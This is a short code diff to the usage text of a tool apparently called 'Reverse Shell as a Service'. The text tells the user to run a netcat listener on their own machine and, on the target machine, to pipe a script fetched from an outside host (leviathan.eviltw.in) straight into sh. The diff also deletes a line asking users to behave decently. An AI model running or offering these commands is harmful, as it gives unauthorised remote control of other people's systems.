@@ -2,12 +2,10 @@
 
 const usage = `# Reverse Shell as a Service
 # 1. On your machine:
-#      nc -l 1337
+#      nc -lvp 666
 #
 # 2. On the target machine:
-#      curl https://envy.eviltw.in/host:port | sh
-#
-# 3. Don't be a dick`;
+#      curl https://leviathan.eviltw.in/host:port | sh`;
 
 const reverseShell = (address = '') => {
 	const [host, port] = address.split(':');
